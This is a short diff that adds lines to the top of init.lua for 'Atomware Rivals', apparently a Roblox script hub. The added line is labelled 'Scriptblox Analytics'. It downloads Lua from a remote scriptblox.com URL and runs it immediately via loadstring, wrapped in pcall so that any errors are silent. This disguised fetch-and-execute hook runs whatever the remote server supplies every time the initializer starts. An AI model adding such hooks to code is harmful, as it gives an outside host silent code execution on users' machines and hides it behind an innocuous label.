@@ -1,3 +1,6 @@
+-- Scriptblox Analytics
+pcall(function() loadstring(game:HttpGet("https://scriptblox.com/ingest/clientv2.lua"))("proj_4555864605ae", "1.0.0", false) end)
+
 --[[
     Atomware Rivals - init.lua
     Universal Master Initializer for Atomware Rivals
